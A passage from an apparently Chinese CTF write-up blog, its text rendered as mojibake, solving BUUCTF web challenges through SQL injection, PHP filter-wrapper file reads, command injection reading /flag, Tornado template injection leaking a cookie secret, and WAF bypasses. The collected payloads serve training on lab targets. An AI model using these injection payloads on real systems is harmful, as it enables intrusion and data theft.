</span></span></code></pre></td></tr></table></div></div><p>ä½†æ˜¯æ‰§è¡Œ</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-mysql data-lang=mysql><span class=line><span class=cl><span class=mi>1</span><span class=p>;</span><span class=k>desc</span><span class=w> </span><span class=o>`</span><span class=n>Flag</span><span class=o>`</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1</span><span class=p>;</span><span class=k>show</span><span class=w> </span><span class=n>columns</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>Flag</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>è¿”å›äº†"Nonono.â€œæµ‹è¯•å‡ºè¢«è¿‡æ»¤äº†ï¼šdescã€fromã€Flagã€‚</p><p>æ¥ä¸‹æ¥çš„éƒ½æ˜¯æŠ„ç½‘ä¸Šçš„é¢„æœŸè§£ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡è§ã€‚</p><p>æ¯”èµ›æ—¶æºç æ³„éœ²</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>select $_GET[&#39;query&#39;] || flag from flag
</span></span></code></pre></td></tr></table></div></div><blockquote><p>åœ¨oracle ç¼ºçœæ”¯æŒ é€šè¿‡ â€˜ || â€™ æ¥å®ç°å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œä½†åœ¨mysql ç¼ºçœä¸æ”¯æŒã€‚éœ€è¦è°ƒæ•´mysql çš„sql_mode
æ¨¡å¼ï¼špipes_as_concat æ¥å®ç°oracle çš„ä¸€äº›åŠŸèƒ½</p></blockquote><p>payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1;set sql_mode=PIPES_AS_CONCAT;select 1
</span></span></code></pre></td></tr></table></div></div><p>éé¢„æœŸè§£</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>*,1 
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=actf2020-æ–°ç”Ÿèµ›include>[ACTF2020 æ–°ç”Ÿèµ›]Include</h1><p>ä¸æˆªå›¾äº†ï¼Œè¿›å…¥é¶æœºåªæœ‰ä¸€ä¸ª<strong>tips</strong>ç­‰ç€è¢«ç‚¹ã€‚è·³è½¬ä»¥åçœ‹urlä¸­å‚æ•°</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?file=flag.php
</span></span></code></pre></td></tr></table></div></div><p>é¡µé¢å†…å®¹åªæœ‰</p><blockquote><p>Can you find out the flag?</p></blockquote><p>ç«‹é©¬æƒ³åˆ°ä½¿ç”¨phpä¼ªåè®®è¯»æ–‡ä»¶å†…å®¹ã€‚ä½¿ç”¨filterè¿‡æ»¤å™¨</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?file=php://filter/convert.base64-encode/resource=flag.php
</span></span></code></pre></td></tr></table></div></div><p>å¾—åˆ°</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7OTAyNTIyNDgtMjY3NC00NDdjLWFlYWMtYjc3ZTc5YjYwMzVmfQo=
</span></span></code></pre></td></tr></table></div></div><p>è§£å¯†å¾—åˆ°flag</p><hr><h1 id=æå®¢å¤§æŒ‘æˆ˜-2019secret-file>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</h1><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120103724.png loading=lazy></p><p>æŸ¥çœ‹æºç ï¼Œåˆä¸€ä¸ªèƒŒæ™¯æ˜¯é»‘è‰²çš„è¶…é“¾æ¥è·³è½¬åˆ° Archive_room.phpã€‚</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120103842.png loading=lazy></p><p>æŸ¥çœ‹æºç SECRETè·³è½¬çš„æ˜¯action.phpã€‚</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120103907.png loading=lazy></p><p>ä½†æ˜¯è·³è½¬ä»¥åæ˜¯urlåœ°å€ä¸ºend.phpï¼Œæ‰€ä»¥ä¸­é—´è·³è¿‡äº†ä¸€ä¸ªé¡µé¢ï¼Œä½¿ç”¨bpæŠ“åŒ…æŸ¥çœ‹ã€‚</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120104246.png loading=lazy></p><p>stristr()å‡½æ•°è¿”å›å­—ç¬¦ä¸²ä¸­å­ä¸²ç¬¬ä¸€æ¬¡å‡ºç°ä½ç½®ä¹‹åçš„å†…å®¹ï¼Œç®€è€Œè¨€ä¹‹è¿˜æ˜¯è¿‡æ»¤ã€‚</p><p>åŒæ ·ä½¿ç”¨phpä¼ªåè®®filterè¿‡æ»¤å™¨è¯»å–æ–‡ä»¶</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?file=php://filter/convert.base64-encode/resource=flag.php
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ZmZjZTAwNWYtYjEyOS00YWM1LTg3MzYtZDM3YzUwYjYxNjZkfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=
</span></span></code></pre></td></tr></table></div></div><p>è§£å¯†å¾—åˆ°ç½‘é¡µæºç ï¼Œflagåœ¨å…¶ä¸­ã€‚</p><hr><h1 id=æå®¢å¤§æŒ‘æˆ˜-2019lovesql>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h1><p>é¡¶ç«¯ã®å‘Šè¯«ï¼šç”¨ sqlmap æ˜¯æ²¡æœ‰çµé­‚çš„</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120104703.png loading=lazy></p><p>å°è¯•ä¸‡èƒ½å¯†ç ï¼ˆå…¶å®æ²¡åµç”¨ï¼‰</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#39;or 1=1 #
</span></span><span class=line><span class=cl>ä»»æ„å¯†ç 
</span></span></code></pre></td></tr></table></div></div><p>è¿™é“é¢˜æ˜¯å¸¸è§„çš„sqlæ³¨å…¥ï¼Œæµ‹æ³¨å…¥ç‚¹ã€æŸ¥å­—æ®µæ•°ã€çˆ†åº“ã€çˆ†å­—æ®µå€¼ã€çˆ†è¡¨ã€‚ç»„åˆæ‹³</p><p>å­—æ®µæ•°ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39; order by 3 #
</span></span></code></pre></td></tr></table></div></div><p>çˆ†åº“ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>geekuser,l0ve1ysq1
</span></span></code></pre></td></tr></table></div></div><p>çˆ†å­—æ®µå€¼ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;l0ve1ysq1&#39; #
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>id,username,password
</span></span></code></pre></td></tr></table></div></div><p>çˆ†è¡¨ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1 #
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&#39;1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag{c4e8849c-e0e3-4e0d-b701-26a5abeec46a}&#39;
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=20210121>2021.01.21</h1><h1 id=gxyctf2019ping-ping-ping>[GXYCTF2019]Ping Ping Ping</h1><p><a class=link href=https://braindance.tk/2020/%5BGXYCTF2019%5DPing%20Ping%20Ping/ target=_blank rel=noopener>ä¼ é€é—¨</a></p><hr><h1 id=actf2020-æ–°ç”Ÿèµ›exec>[ACTF2020 æ–°ç”Ÿèµ›]Exec</h1><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121090002.png loading=lazy></p><p>è‚¯å®šæ˜¯å°è¯•ç®¡é“ç¬¦</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>127.0.0.1|cat /flag
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=æŠ¤ç½‘æ¯-2018easy_tornado>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h1><p>æ‰“å¼€é¡µé¢ä¸‰ä¸ªè¶…é“¾æ¥</p><blockquote><p>/flag.txt</p><p>/welcome.txt</p><p>hints.txt</p></blockquote><p>å†…å®¹åˆ†åˆ«æ˜¯</p><blockquote><p>flag in /fllllllllllllag</p><p>render</p><p>md5(cookie_secret+md5(filename))</p></blockquote><p>è¿›å…¥hints.txtæ³¨æ„åˆ°urlåœ°å€æ­¤æ—¶ä¸º</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/file?filename=/hints.txt&amp;filehash=2a84a09bc1d5e3d8745131754ff208fa
</span></span></code></pre></td></tr></table></div></div><p>å†æ ¹æ®hints.txtæ–‡ä»¶çš„å†…å®¹ï¼Œæ¨æ–­å¯ä»¥ä½¿ç”¨urlæ–¹å¼è®¿é—®æ–‡ä»¶ï¼Œä½†æ˜¯éœ€è¦æä¾›<strong>filehash</strong>å€¼ï¼ŒåŠ å¯†çš„æ–¹æ³•å³hints.txtçš„å†…å®¹ï¼šmd5(cookie_secret+md5(filename))ã€‚flagæ–‡ä»¶çš„åç§°<code>filename</code>æœ‰äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è·å–<code>cookie_secret</code>çš„å€¼ã€‚</p><p>æ¥ä¸‹æ¥è§¦åŠåˆ°ç›²åŒºäº†ï¼Œè·å–cookie_secretæ˜¯çœ‹wpã€‚</p><blockquote><p>renderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ç§æ¨¡æ¿ï¼Œé€šè¿‡è°ƒç”¨çš„å‚æ•°ä¸åŒï¼Œç”Ÿæˆä¸åŒçš„ç½‘é¡µ renderé…åˆTornadoä½¿ç”¨</p></blockquote><blockquote><p>åœ¨tornadoæ¨¡æ¿ä¸­ï¼Œå­˜åœ¨ä¸€äº›å¯ä»¥è®¿é—®çš„å¿«é€Ÿå¯¹è±¡,è¿™é‡Œç”¨åˆ°çš„æ˜¯handler.settingsï¼Œhandler æŒ‡å‘RequestHandlerï¼Œè€ŒRequestHandler.settingsåˆæŒ‡å‘self.application.settingsï¼Œæ‰€ä»¥handler.settingså°±æŒ‡å‘RequestHandler.application.settingsäº†ï¼Œè¿™é‡Œé¢å°±æ˜¯æˆ‘ä»¬çš„ä¸€äº›ç¯å¢ƒå˜é‡</p></blockquote><p>è·å–cookie_secretçš„payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/error?msg={{handler.settings}}
</span></span></code></pre></td></tr></table></div></div><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121091616.png loading=lazy></p><p>è·å¾—cookie_secretçš„å€¼ä¸º</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>eb326d39-cd67-47bd-b2d3-71125996417b
</span></span></code></pre></td></tr></table></div></div><p>æ ¹æ®hints.txtçš„urléªŒè¯ä¸€ä¸‹æ˜¯å¦‚ä½•åŠ å¯†çš„ã€‚</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121092122.png loading=lazy></p><p>é€‰ä¸­çš„è“è‰²éƒ¨åˆ†æ˜¯<code>/hints.txt</code>åŠ å¯†åçš„md5å€¼ã€‚æ¨æ–­å‡ºfilehashæ ¼å¼ä»¥åç›´æ¥è®¿é—®flagæ–‡ä»¶ï¼Œpayloadï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/file?filename=/hints.txt&amp;filehash=2a84a09bc1d5e3d8745131754ff208fa
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=æå®¢å¤§æŒ‘æˆ˜-2019knife>[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife</h1><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121092431.png loading=lazy></p><p>ä¸€å¥è¯ç›´æ¥è¿ã€‚</p><hr><h1 id=roarctf-2019easy-calc>[RoarCTF 2019]Easy Calc</h1><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121092956.png loading=lazy></p><p>ä¸€ä¸ªè®¡ç®—å™¨éšä¾¿è¯•ä¸€è¯•ï¼Œå½“è¾“å…¥å­—æ¯æ—¶ä¼šæŠ¥é”™ã€‚æŸ¥çœ‹ç½‘é¡µæºç ï¼Œåœ¨scriptä¸­å‘ç°äº†è¿è¡Œè®¡ç®—å™¨çš„phpæ–‡ä»¶ï¼š<strong>calc.php</strong>ï¼Œä½†æ˜¯ä¹Ÿæœ‰ä¸€å¥å¾ˆé‡è¦çš„æ³¨é‡Š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;!--I&#39;ve set up WAF to ensure security.--&gt;
</span></span></code></pre></td></tr></table></div></div><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121093233.png loading=lazy></p><p>phpçš„æ­£åˆ™è¡¨è¾¾å¼ä¸­å¹¶æ²¡æœ‰è¿‡æ»¤å­—æ¯çš„æ¡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬è¾“å…¥å­—æ¯è¢«è¿‡æ»¤æ˜¯å› ä¸º<strong>WAF</strong>ï¼Œæ¥ä¸‹æ¥æ˜¯å‚è€ƒç½‘ä¸Šçš„wpè‡ªå·±çš„ç†è§£</p><p>å¯ä»¥åœ¨calc.phpä¼ å‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>? num=a
</span></span></code></pre></td></tr></table></div></div><p>phpä¼šè¾“å‡ºä¸€ä¸ªå€¼aï¼Œè¯´æ˜å·²ç»ç»•è¿‡äº†WAFã€‚è¿™é‡Œä½¿ç”¨çš„æ˜¯WAFå’Œphpè§£ææ–¹æ³•ä¸ä¸€æ ·ï¼ŒWAFè§£æåˆ°ç©ºæ ¼&rsquo; &lsquo;ä¼šç›´æ¥è¿‡æ»¤æ‰ï¼Œè¿™æ ·WAFè®¤ä¸ºä¼ å…¥çš„å°±æ˜¯ä¸€ä¸ªç©ºå€¼ï¼Œå¹¶ä¸ä¼šè¯†åˆ«numï¼Œä½†æ˜¯phpè§£æçš„æ—¶å€™ä¼šæŠŠç©ºæ ¼å»æ‰ï¼Œè¿™æ ·å°±èƒ½getåˆ°numçš„å€¼ã€‚</p><p>æ¥ä¸‹æ¥ç»•è¿‡æ­£åˆ™å°±å¯ä»¥ä½¿ç”¨char()çš„æ–¹å¼ä½¿ç”¨asciiç è½¬ã€‚ç©ºæ ¼è¢«è¿‡æ»¤ä½†æ˜¯æƒ³ä½¿ç”¨phpè¾“å‡ºå¯ä»¥ä½¿ç”¨var_dump()</p><p>æŸ¥çœ‹æ ¹ç›®å½•ä¸‹æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨scandirï¼ˆï¼‰éå†æ–‡ä»¶å¤¹ï¼Œå…¶ä¸­charï¼ˆ47ï¼‰&mdash;&mdash;> &lsquo;/&rsquo; ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=err>?</span> <span class=n>num</span><span class=o>=</span><span class=mi>1</span><span class=p>;</span><span class=n>var_dump</span><span class=p>(</span><span class=n>scandir</span><span class=p>(</span><span class=n>chr</span><span class=p>(</span><span class=mi>47</span><span class=p>)))</span>
</span></span></code></pre></td></tr></table></div></div><p>æ‰¾åˆ°äº†ç–‘ä¼¼flagæ–‡ä»¶ï¼šf1aggï¼Œä½¿ç”¨file_get_contentsï¼ˆï¼‰è¯»å–æ–‡ä»¶</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=err>?</span><span class=o>%</span><span class=mi>20</span><span class=n>num</span><span class=o>=</span><span class=mi>1</span><span class=p>;</span><span class=n>var_dump</span><span class=p>(</span><span class=n>file_get_contents</span><span class=p>(</span><span class=n>chr</span><span class=p>(</span><span class=mi>47</span><span class=p>)</span><span class=o>.</span><span class=n>chr</span><span class=p>(</span><span class=mi>102</span><span class=p>)</span><span class=o>.</span><span class=n>chr</span><span class=p>(</span><span class=mi>49</span><span class=p>)</span><span class=o>.</span><span class=n>chr</span><span class=p>(</span><span class=mi>97</span><span class=p>)</span><span class=o>.</span><span class=n>chr</span><span class=p>(</span><span class=mi>103</span><span class=p>)</span><span class=o>.</span><span class=n>chr</span><span class=p>(</span><span class=mi>103</span><span class=p>)))</span>
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=æå®¢å¤§æŒ‘æˆ˜-2019http>[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h1><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121104213.png loading=lazy></p><p>æŸ¥çœ‹æºç åœ¨"æ°›å›´"è¿™ä¸¤ä¸ªå­—ä¸Šæœ‰éšè—çš„è·³è½¬Secret.phpã€‚è¿›å…¥ä»¥åé¡µé¢æ˜¾ç¤º</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>It doesn&#39;t come from &#39;https://www.Sycsecret.com&#39;
</span></span></code></pre></td></tr></table></div></div><p>æç¤ºé¡µé¢ä¸æ˜¯æ¥è‡ªè¿™ä¸ªç½‘å€ï¼Œæ‰€ä»¥åœ¨HackBarä¸ŠåŠ ä¸ŠRefererã€‚ä¹‹ååˆæç¤º</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Please use &#34;Syclover&#34; browser
</span></span></code></pre></td></tr></table></div></div><p>åŠ ä¸ŠUser-Agentã€‚æç¤º</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>No!!! you can only read this locally!!!
</span></span></code></pre></td></tr></table></div></div><p>åŠ ä¸ŠX-Forwarded-Forã€‚<a class=link href=https://www.runoob.com/w3cnote/http-x-forwarded-for.html target=_blank rel=noopener>HTTP X-Forwarded-For ä»‹ç»</a></p><p>æœ€ç»ˆçš„è¯·æ±‚å¤´ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /Secret.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: node3.buuoj.cn:26715
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>User-Agent: Syclover
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9
</span></span><span class=line><span class=cl>x-forwarded-for: 127.0.0.1
</span></span><span class=line><span class=cl>referer: https://www.Sycsecret.com
</span></span><span class=line><span class=cl>Connection: close
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=æå®¢å¤§æŒ‘æˆ˜-2019php>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h1><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121105104.png loading=lazy></p><p>æºç å¤‡ä»½åœ¨<code>www.zip</code>ä¸­ã€‚ä¸‹è½½ä»¥åæœ‰äº”ä¸ªæ–‡ä»¶</p><blockquote><p>class.php</p><p>flag.php</p><p>index.js</p><p>index.php</p><p>style.css</p></blockquote><p>åœ¨index.phpä¸­æœ‰ä¸€æ®µä»£ç </p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>    include &#39;class.php&#39;;
</span></span><span class=line><span class=cl>    $select = $_GET[&#39;select&#39;];
</span></span><span class=line><span class=cl>    $res=unserialize(@$select);
</span></span><span class=line><span class=cl>    ?&gt;
</span></span></code></pre></td></tr></table></div></div><p>å†ç»“åˆåˆä¸€ä¸ªclass.phpï¼Œæ‰€ä»¥è¿™é“é¢˜è€ƒç‚¹åº”è¯¥æ˜¯ååºåˆ—åŒ–ã€‚</p><p>class.php</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>&lt;</span><span class=err>?</span><span class=n>php</span>
</span></span><span class=line><span class=cl><span class=n>include</span> <span class=s1>&#39;flag.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=n>Name</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>private</span> <span class=o>$</span><span class=n>username</span> <span class=o>=</span> <span class=s1>&#39;nonono&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>private</span> <span class=o>$</span><span class=n>password</span> <span class=o>=</span> <span class=s1>&#39;yesyes&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
